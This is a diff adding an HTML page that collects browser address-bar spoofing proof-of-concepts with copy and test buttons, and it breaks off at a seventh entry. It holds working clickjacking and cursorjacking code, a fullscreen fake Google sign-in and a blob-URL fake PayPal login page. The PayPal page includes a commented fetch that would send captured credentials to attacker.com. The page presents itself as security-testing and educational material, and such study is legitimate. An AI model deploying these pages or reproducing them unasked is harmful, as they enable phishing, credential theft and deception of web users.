@@ -1,0 +1,2137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Complete Address Bar Spoofing POC Collection (2005-2024)</title>
+    <style>
+        :root {
+            --critical: #dc2626;
+            --high: #ea580c;
+            --medium: #d97706;
+            --low: #059669;
+            --chrome: #1a73e8;
+            --firefox: #ff9500;
+            --safari: #06c;
+            --edge: #0078d4;
+            --ie: #1ebbee;
+            --dark: #0f172a;
+            --light: #f8fafc;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px;
+            background: rgba(30, 41, 59, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, 
+                var(--chrome), 
+                var(--firefox), 
+                var(--safari), 
+                var(--edge)
+            );
+        }
+        
+        .warning {
+            background: linear-gradient(135deg, #7c2d12, #9a3412);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px auto;
+            border: 2px solid rgba(251, 191, 36, 0.3);
+            text-align: center;
+        }
+        
+        .era-section {
+            margin: 40px 0;
+        }
+        
+        .era-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(100, 116, 139, 0.3);
+        }
+        
+        .era-year {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--medium), var(--high));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .poc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+        
+        .poc-card {
+            background: rgba(30, 41, 59, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .poc-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--chrome), var(--firefox));
+        }
+        
+        .poc-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--chrome);
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.2);
+        }
+        
+        .poc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .poc-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 600;
+            font-size: 16px;
+            color: #60a5fa;
+        }
+        
+        .severity-badge {
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .severity-critical { background: var(--critical); color: white; }
+        .severity-high { background: var(--high); color: white; }
+        .severity-medium { background: var(--medium); color: white; }
+        .severity-low { background: var(--low); color: white; }
+        
+        .browser-badges {
+            display: flex;
+            gap: 8px;
+            margin: 10px 0;
+            flex-wrap: wrap;
+        }
+        
+        .browser-badge {
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        
+        .browser-chrome { background: var(--chrome); color: white; }
+        .browser-firefox { background: var(--firefox); color: white; }
+        .browser-safari { background: var(--safari); color: white; }
+        .browser-edge { background: var(--edge); color: white; }
+        .browser-ie { background: var(--ie); color: white; }
+        
+        .poc-description {
+            margin: 15px 0;
+            color: #cbd5e1;
+            font-size: 14px;
+        }
+        
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+        }
+        
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(15, 23, 42, 0.9);
+            padding: 10px 15px;
+            border-radius: 8px 8px 0 0;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            border-bottom: none;
+        }
+        
+        .code-language {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        
+        .copy-btn {
+            padding: 5px 10px;
+            background: rgba(59, 130, 246, 0.2);
+            border: 1px solid var(--chrome);
+            color: #60a5fa;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: var(--chrome);
+            color: white;
+        }
+        
+        .code-block {
+            background: rgba(15, 23, 42, 0.9);
+            padding: 20px;
+            border-radius: 0 0 8px 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            color: #cbd5e1;
+            line-height: 1.4;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .test-btn {
+            padding: 12px 24px;
+            background: linear-gradient(135deg, var(--chrome), #3b82f6);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        
+        .test-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(37, 99, 235, 0.4);
+        }
+        
+        .test-btn.danger {
+            background: linear-gradient(135deg, var(--critical), #ef4444);
+        }
+        
+        .test-btn.warning {
+            background: linear-gradient(135deg, var(--medium), #f59e0b);
+        }
+        
+        .result-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 450px;
+            max-height: 500px;
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 15px;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 1000;
+            border: 1px solid rgba(100, 116, 139, 0.5);
+            backdrop-filter: blur(10px);
+            display: none;
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(100, 116, 139, 0.3);
+        }
+        
+        .result-item {
+            padding: 12px;
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border-left: 3px solid var(--chrome);
+            font-size: 13px;
+        }
+        
+        .result-item.success {
+            border-left-color: var(--low);
+        }
+        
+        .result-item.error {
+            border-left-color: var(--critical);
+        }
+        
+        .result-item.warning {
+            border-left-color: var(--medium);
+        }
+        
+        .controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1001;
+            display: flex;
+            gap: 10px;
+        }
+        
+        .controls-btn {
+            padding: 10px 20px;
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            border-radius: 8px;
+            color: var(--light);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .demo-window {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            overflow: hidden;
+            display: none;
+            min-width: 500px;
+        }
+        
+        .demo-header {
+            background: #f1f3f4;
+            padding: 15px;
+            border-bottom: 1px solid #dadce0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .demo-url {
+            flex: 1;
+            background: white;
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: 1px solid #dadce0;
+            font-family: monospace;
+            font-size: 14px;
+            color: #0f172a;
+        }
+        
+        .demo-content {
+            padding: 30px;
+            color: #0f172a;
+        }
+        
+        .close-btn {
+            background: #ef4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-success { background: var(--low); box-shadow: 0 0 10px var(--low); }
+        .status-error { background: var(--critical); box-shadow: 0 0 10px var(--critical); }
+        .status-warning { background: var(--medium); box-shadow: 0 0 10px var(--medium); }
+        
+        @media (max-width: 768px) {
+            .poc-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .result-panel {
+                width: 90%;
+                right: 5%;
+            }
+            
+            .demo-window {
+                min-width: 90%;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-bug"></i> Complete Address Bar Spoofing POC Collection</h1>
+            <p>2005-2024: Working Proof of Concept scripts for testing browser security</p>
+            
+            <div class="warning">
+                <h3><i class="fas fa-exclamation-triangle"></i> FOR SECURITY TESTING ONLY</h3>
+                <p>Use only on systems you own or have explicit permission to test. All POCs are for educational purposes.</p>
+                <p><strong>Browser security has improved - many old POCs may not work in modern browsers.</strong></p>
+            </div>
+        </div>
+        
+        <!-- Controls -->
+        <div class="controls">
+            <button class="controls-btn" onclick="toggleResults()">
+                <i class="fas fa-terminal"></i> Results
+            </button>
+            <button class="controls-btn" onclick="clearAll()">
+                <i class="fas fa-trash"></i> Clear All
+            </button>
+        </div>
+        
+        <!-- Era 1: 2005-2009 (Early Internet Explorer) -->
+        <div class="era-section">
+            <div class="era-title">
+                <div class="era-year">2005-2009</div>
+                <div style="font-size: 18px; color: #94a3b8;">
+                    Early Internet Explorer Vulnerabilities
+                </div>
+            </div>
+            
+            <div class="poc-grid">
+                <!-- POC 1: Basic window.open spoofing -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2005-001</div>
+                        <span class="severity-badge severity-high">High</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-ie">Internet Explorer 6</span>
+                    </div>
+                    
+                    <h3>Basic window.open Address Bar Spoofing</h3>
+                    <div class="poc-description">
+                        Early IE6 vulnerability where window.open could be manipulated to show fake URL.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript</span>
+                            <button class="copy-btn" onclick="copyCode('poc1')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc1">// IE6 Address Bar Spoofing (2005)
+function spoofAddressBarIE6() {
+    // Open window to legitimate site
+    var win = window.open('http://microsoft.com', '_blank');
+    
+    // Wait for window to load, then modify content
+    setTimeout(function() {
+        try {
+            // Write fake content while URL still shows microsoft.com
+            win.document.write(
+                '&lt;html&gt;&lt;head&gt;&lt;title&gt;Windows Update&lt;/title&gt;&lt;/head&gt;' +
+                '&lt;body&gt;&lt;h1&gt;Windows Security Update Required&lt;/h1&gt;' +
+                '&lt;p&gt;Your computer needs immediate attention&lt;/p&gt;' +
+                '&lt;button onclick="alert(\'Malware would be installed\')"&gt;' +
+                'Install Updates Now&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;'
+            );
+            win.document.close();
+        } catch(e) {
+            // IE6 didn't have strict CORS policies
+        }
+    }, 2000);
+}
+
+// Usage
+// &lt;button onclick="spoofAddressBarIE6()"&gt;Test IE6 Spoof&lt;/button&gt;</pre>
+                    </div>
+                    
+                    <button class="test-btn" onclick="runPOC('poc1')">
+                        <i class="fas fa-play"></i> Test This POC
+                    </button>
+                </div>
+                
+                <!-- POC 2: VML buffer overflow spoof -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2007-001</div>
+                        <span class="severity-badge severity-critical">Critical</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-ie">IE 5.5-7</span>
+                    </div>
+                    
+                    <h3>CVE-2007-0018: VML Buffer Overflow</h3>
+                    <div class="poc-description">
+                        Vector Markup Language buffer overflow leading to code execution and UI control.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">HTML + VML</span>
+                            <button class="copy-btn" onclick="copyCode('poc2')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc2">&lt;!-- VML Buffer Overflow Exploit (simplified) --&gt;
+&lt;html xmlns:v="urn:schemas-microsoft-com:vml"&gt;
+&lt;head&gt;
+&lt;style&gt;v\\: * { behavior: url(#default#VML); }&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;!-- Overly long fill color causes buffer overflow --&gt;
+&lt;v:rect 
+    style="width:100px;height:100px" 
+    fillcolor="red"
+    strokecolor="red"
+    strokeweight="2px"&gt;
+    
+    &lt;v:fill 
+        type="gradient" 
+        method="linear" 
+        angle="0" 
+        color="red"
+        color2="blue"
+        colors="0% red, 50% blue, 100% red"
+        // Hundreds more color stops here...
+    /&gt;
+&lt;/v:rect&gt;
+
+&lt;script&gt;
+// After overflow, could execute shellcode
+// Real exploit would include shellcode here
+alert('DEMO: Buffer overflow would execute shellcode');
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                    
+                    <button class="test-btn warning" onclick="runPOC('poc2')">
+                        <i class="fas fa-shield-alt"></i> Demo Only
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Era 2: 2010-2014 (Clickjacking Era) -->
+        <div class="era-section">
+            <div class="era-title">
+                <div class="era-year">2010-2014</div>
+                <div style="font-size: 18px; color: #94a3b8;">
+                    Clickjacking and UI Redressing
+                </div>
+            </div>
+            
+            <div class="poc-grid">
+                <!-- POC 3: Basic Clickjacking -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2010-001</div>
+                        <span class="severity-badge severity-medium">Medium</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-firefox">Firefox</span>
+                        <span class="browser-badge browser-ie">IE</span>
+                    </div>
+                    
+                    <h3>Basic Clickjacking with iframe</h3>
+                    <div class="poc-description">
+                        Transparent iframe over legitimate button to hijack clicks.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">HTML + CSS</span>
+                            <button class="copy-btn" onclick="copyCode('poc3')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc3">&lt;!-- Basic Clickjacking Example --&gt;
+&lt;style&gt;
+    #legitimateButton {
+        position: relative;
+        padding: 20px;
+        background: #4CAF50;
+        color: white;
+        border: none;
+        cursor: pointer;
+        font-size: 16px;
+        border-radius: 5px;
+    }
+    
+    #maliciousFrame {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.01; /* Almost invisible */
+        z-index: 9999;
+        cursor: pointer;
+    }
+&lt;/style&gt;
+
+&lt;button id="legitimateButton" onclick="legitimateAction()"&gt;
+    Click here to win $1000!
+&lt;/button&gt;
+
+&lt;iframe id="maliciousFrame" src="about:blank"&gt;&lt;/iframe&gt;
+
+&lt;script&gt;
+    // Legitimate action (what user thinks will happen)
+    function legitimateAction() {
+        alert('You won $1000! (Not really)');
+    }
+    
+    // Malicious action (what actually happens)
+    document.getElementById('maliciousFrame').onload = function() {
+        var iframeDoc = this.contentDocument || this.contentWindow.document;
+        iframeDoc.write(
+            '&lt;button style="width:100%;height:100%;opacity:0;" ' +
+            'onclick="parent.maliciousAction()"&gt;&lt;/button&gt;'
+        );
+        iframeDoc.close();
+    };
+    
+    function maliciousAction() {
+        // Actually transfer money or install malware
+        alert('MALICIOUS: Money transferred to attacker!');
+        // In real attack: window.location = 'malicious-download.exe';
+    }
+&lt;/script&gt;</pre>
+                    </div>
+                    
+                    <button class="test-btn" onclick="runPOC('poc3')">
+                        <i class="fas fa-play"></i> Test Clickjacking
+                    </button>
+                </div>
+                
+                <!-- POC 4: Cursorjacking -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2012-001</div>
+                        <span class="severity-badge severity-high">High</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-firefox">Firefox</span>
+                    </div>
+                    
+                    <h3>Cursorjacking Attack</h3>
+                    <div class="poc-description">
+                        Manipulate cursor position to make users click in wrong places.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript + CSS</span>
+                            <button class="copy-btn" onclick="copyCode('poc4')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc4">&lt;!-- Cursorjacking Demo --&gt;
+&lt;style&gt;
+    body {
+        margin: 0;
+        padding: 100px;
+        font-family: Arial;
+    }
+    
+    .real-button {
+        position: absolute;
+        top: 200px;
+        left: 200px;
+        padding: 20px 40px;
+        background: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        cursor: pointer;
+    }
+    
+    .fake-cursor {
+        position: fixed;
+        width: 20px;
+        height: 30px;
+        pointer-events: none;
+        z-index: 10000;
+        background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCAyMCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEgMUwxOC41IDE0LjVMMTMuNSAxNC41TDE2LjUgMjlMMTIuNSAyNUw5IDI5TDggMjAuNUwxIDE5LjVWMSIgZmlsbD0iYmxhY2siLz4KPHBhdGggZD0iTTEgMUwxOC41IDE0LjVMMTMuNSAxNC41TDE2LjUgMjlMMTIuNSAyNUw5IDI5TDggMjAuNUwxIDE5LjVWMSIgZmlsbD0id2hpdGUiLz4KPC9zdmc+');
+        background-size: contain;
+    }
+    
+    .malicious-button {
+        position: absolute;
+        top: 250px; /* Actually here */
+        left: 250px;
+        padding: 20px 40px;
+        background: #dc2626;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        opacity: 0.1; /* Almost invisible */
+    }
+&lt;/style&gt;
+
+&lt;button class="real-button" onclick="safeAction()"&gt;
+    Safe Download
+&lt;/button&gt;
+
+&lt;button class="malicious-button" onclick="maliciousAction()"&gt;
+    Malware Download
+&lt;/button&gt;
+
+&lt;div class="fake-cursor" id="fakeCursor"&gt;&lt;/div&gt;
+
+&lt;script&gt;
+    var cursorOffsetX = 50;
+    var cursorOffsetY = 50;
+    
+    document.addEventListener('mousemove', function(e) {
+        var fakeCursor = document.getElementById('fakeCursor');
+        // Show fake cursor offset from real position
+        fakeCursor.style.left = (e.clientX + cursorOffsetX) + 'px';
+        fakeCursor.style.top = (e.clientY + cursorOffsetY) + 'px';
+        
+        // Make offset larger when near real button
+        var realButton = document.querySelector('.real-button');
+        var rect = realButton.getBoundingClientRect();
+        
+        if (e.clientX &gt;= rect.left && e.clientX &lt;= rect.right &&
+            e.clientY &gt;= rect.top && e.clientY &lt;= rect.bottom) {
+            cursorOffsetX = 100;
+            cursorOffsetY = 100;
+        } else {
+            cursorOffsetX = 50;
+            cursorOffsetY = 50;
+        }
+    });
+    
+    function safeAction() {
+        alert('Safe action triggered (what user intended)');
+    }
+    
+    function maliciousAction() {
+        alert('MALWARE DOWNLOAD! (what actually happened)');
+    }
+&lt;/script&gt;</pre>
+                    </div>
+                    
+                    <button class="test-btn warning" onclick="runPOC('poc4')">
+                        <i class="fas fa-mouse-pointer"></i> Test Cursorjacking
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Era 3: 2015-2019 (Modern Browser Attacks) -->
+        <div class="era-section">
+            <div class="era-title">
+                <div class="era-year">2015-2019</div>
+                <div style="font-size: 18px; color: #94a3b8;">
+                    Modern Browser Exploits and Bypasses
+                </div>
+            </div>
+            
+            <div class="poc-grid">
+                <!-- POC 5: Fullscreen API Spoofing -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2018-001</div>
+                        <span class="severity-badge severity-medium">Medium</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-firefox">Firefox</span>
+                    </div>
+                    
+                    <h3>Fullscreen API Address Bar Hiding</h3>
+                    <div class="poc-description">
+                        Use Fullscreen API to hide browser UI and spoof address bar with HTML/CSS.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript + CSS</span>
+                            <button class="copy-btn" onclick="copyCode('poc5')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc5">&lt;!-- Fullscreen Address Bar Spoofing --&gt;
+&lt;style&gt;
+    .fake-browser {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: white;
+        z-index: 999999;
+    }
+    
+    .fake-url-bar {
+        background: #f1f3f4;
+        padding: 12px;
+        border-bottom: 1px solid #dadce0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-family: -apple-system, system-ui, sans-serif;
+    }
+    
+    .fake-url {
+        flex: 1;
+        background: white;
+        padding: 8px 16px;
+        border-radius: 20px;
+        border: 1px solid #dadce0;
+        font-family: 'SF Mono', monospace;
+        color: #0f172a;
+        font-size: 14px;
+    }
+    
+    .fake-content {
+        padding: 40px;
+        text-align: center;
+    }
+    
+    .controls {
+        display: flex;
+        gap: 8px;
+    }
+    
+    .control-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+    }
+    
+    .red { background: #ff5f57; }
+    .yellow { background: #ffbd2e; }
+    .green { background: #28ca42; }
+&lt;/style&gt;
+
+&lt;button onclick="startFullscreenSpoof()"&gt;
+    Start Fullscreen Spoof Attack
+&lt;/button&gt;
+
+&lt;div class="fake-browser" id="fakeBrowser"&gt;
+    &lt;div class="fake-url-bar"&gt;
+        &lt;div class="controls"&gt;
+            &lt;div class="control-dot red"&gt;&lt;/div&gt;
+            &lt;div class="control-dot yellow"&gt;&lt;/div&gt;
+            &lt;div class="control-dot green"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="fake-url"&gt;https://accounts.google.com&lt;/div&gt;
+        &lt;button onclick="exitFullscreen()" style="padding:5px 10px;"&gt;✕&lt;/button&gt;
+    &lt;/div&gt;
+    &lt;div class="fake-content"&gt;
+        &lt;h1&gt;Google Sign In&lt;/h1&gt;
+        &lt;p&gt;Fullscreen mode hides real browser UI&lt;/p&gt;
+        &lt;input type="email" placeholder="Email" style="padding:10px;margin:10px;"&gt;&lt;br&gt;
+        &lt;input type="password" placeholder="Password" style="padding:10px;margin:10px;"&gt;&lt;br&gt;
+        &lt;button onclick="stealCredentials()" style="padding:10px 20px;"&gt;Sign In&lt;/button&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    function startFullscreenSpoof() {
+        // Request fullscreen
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) {
+            document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+            document.documentElement.msRequestFullscreen();
+        }
+        
+        // Show fake browser UI
+        setTimeout(() => {
+            document.getElementById('fakeBrowser').style.display = 'block';
+        }, 500);
+    }
+    
+    function exitFullscreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+        document.getElementById('fakeBrowser').style.display = 'none';
+    }
+    
+    function stealCredentials() {
+        alert('DEMO: Credentials would be stolen');
+    }
+    
+    // Exit fullscreen when user presses ESC
+    document.addEventListener('fullscreenchange', exitFullscreen);
+    document.addEventListener('mozfullscreenchange', exitFullscreen);
+    document.addEventListener('webkitfullscreenchange', exitFullscreen);
+    document.addEventListener('msfullscreenchange', exitFullscreen);
+&lt;/script&gt;</pre>
+                    </div>
+                    
+                    <button class="test-btn" onclick="runPOC('poc5')">
+                        <i class="fas fa-expand"></i> Test Fullscreen Spoof
+                    </button>
+                </div>
+                
+                <!-- POC 6: Blob URL Phishing -->
+                <div class="poc-card">
+                    <div class="poc-header">
+                        <div class="poc-id">POC-2019-001</div>
+                        <span class="severity-badge severity-high">High</span>
+                    </div>
+                    
+                    <div class="browser-badges">
+                        <span class="browser-badge browser-chrome">Chrome</span>
+                        <span class="browser-badge browser-firefox">Firefox</span>
+                        <span class="browser-badge browser-edge">Edge</span>
+                    </div>
+                    
+                    <h3>Blob URL Phishing Attack</h3>
+                    <div class="poc-description">
+                        Create phishing pages using blob: URLs that look like legitimate sites.
+                    </div>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">JavaScript</span>
+                            <button class="copy-btn" onclick="copyCode('poc6')">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                        <pre class="code-block" id="poc6">// Blob URL Phishing POC
+function createBlobPhishing() {
+    // Create fake PayPal login page
+    const paypalPhishing = `
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;PayPal - Log In&lt;/title&gt;
+            &lt;style&gt;
+                * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+                body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
+                .logo { color: #003087; font-size: 32px; font-weight: bold; margin-bottom: 20px; text-align: center; }
+                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
+                button { width: 100%; padding: 12px; background: #003087; color: white; border: none; border-radius: 4px; cursor: pointer; }
+                .security-notice { margin-top: 20px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 4px; }
+                .blob-warning { margin-top: 10px; padding: 10px; background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; font-size: 12px; }
+            &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class="container"&gt;
+                &lt;div class="logo"&gt;PayPal&lt;/div&gt;
+                &lt;h2&gt;Log in to your account&lt;/h2&gt;
+                &lt;input type="email" id="email" placeholder="Email address"&gt;
+                &lt;input type="password" id="password" placeholder="Password"&gt;
+                &lt;button onclick="submitLogin()"&gt;Log In&lt;/button&gt;
+                
+                &lt;div class="security-notice"&gt;
+                    &lt;strong&gt;⚠ Security Alert&lt;/strong&gt;
+                    &lt;p&gt;We detected unusual activity. Please verify your account.&lt;/p&gt;
+                &lt;/div&gt;
+                
+                &lt;div class="blob-warning"&gt;
+                    &lt;strong&gt;DEMONSTRATION ONLY&lt;/strong&gt;
+                    &lt;p&gt;This is a blob: URL phishing simulation. Real URL: blob:${window.location.origin}/...&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            
+            &lt;script&gt;
+                function submitLogin() {
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    
+                    if (email && password) {
+                        alert('DEMO: Would steal: ' + email + ' / ' + password);
+                        
+                        // In real attack, exfiltrate credentials
+                        // fetch('https://attacker.com/log', {
+                        //     method: 'POST',
+                        //     body: JSON.stringify({email, password}),
+                        //     mode: 'no-cors'
+                        // });
+                        
+                        // Redirect to real PayPal after delay
+                        setTimeout(() => {
+                            window.location.href = 'https://www.paypal.com';
+                        }, 2000);
+                    }
+                }
+                
+                // Auto-focus on email field
+                document.getElementById('email').focus();
+                
+                // Show security alert after 3 seconds
+                setTimeout(() => {
+                    alert('🔒 PayPal Security: Please complete verification');
+                }, 3000);
+            &lt;\/script&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+    `;
+    
+    // Create blob and URL
+    const blob = new Blob([paypalPhishing], { type: 'text/html' });
+    const blobUrl = URL.createObjectURL(blob);
+    
+    // Open in new window
+    const win = window.open(blobUrl, '_blank', 'width=500,height=700');
+    
+    // Clean up blob URL after window closes
+    win.onbeforeunload = () => URL.revokeObjectURL(blobUrl);
+    
+    return win;
+}
+
+// Usage: createBlobPhishing();</pre>
+                    </div>
+                    
+                    <button class="test-btn" onclick="runPOC('poc6')">
+                        <i class="fas fa-file-code"></i> Test Blob Phishing
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Era 4: 2020-2024 (Advanced Bypasses) -->
+        <div class="era-section">
+            <div class="era-title">
+                <div class="era-year">2020-2024</div>
+                <div style="font-size: 18px; color: #94a3b8;">
+                    Advanced Protections and New Bypasses
+                </div>
+            </div>
+            
+            <div class="poc-grid">
+                <!-- POC 7: iframe Sandbox Bypass -->
+                <div class="poc-card">
+                    <div class="poc-header">
